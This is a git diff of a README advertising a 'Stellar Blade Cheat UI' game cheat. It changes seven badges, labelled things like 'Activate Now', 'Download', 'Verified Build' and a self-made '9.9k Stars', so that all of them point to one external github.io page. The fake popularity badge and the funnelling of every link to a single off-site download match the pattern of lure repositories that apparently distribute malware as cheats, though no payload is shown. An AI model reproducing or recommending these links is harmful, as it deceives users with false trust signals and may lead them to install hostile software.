@@ -23,10 +23,10 @@ Instead of editing configs manually, the Cheat UI brings **real-time customizati
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 9.9k Stars](https://img.shields.io/badge/GitHub-9.9k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://stellar-blade-cheat-ui.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://stellar-blade-cheat-ui.github.io/.github/)
+[![⭐️ 9.9k Stars](https://img.shields.io/badge/GitHub-9.9k_Stars-green?logo=github\&style=for-the-badge)](https://stellar-blade-cheat-ui.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://stellar-blade-cheat-ui.github.io/.github/)
 
 ---
 
@@ -155,8 +155,8 @@ A: It reduces risks but is never 100% undetectable.
 
 The **Stellar Blade Cheat UI** combines **ESP, aim assist, and loot tracking** into a **clean in-game interface**. With customizable profiles, hotkey switching, and overlay menus, it gives players full control over survival, farming, and boss strategies.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://stellar-blade-cheat-ui.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://stellar-blade-cheat-ui.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://stellar-blade-cheat-ui.github.io/.github/)
 
 ---
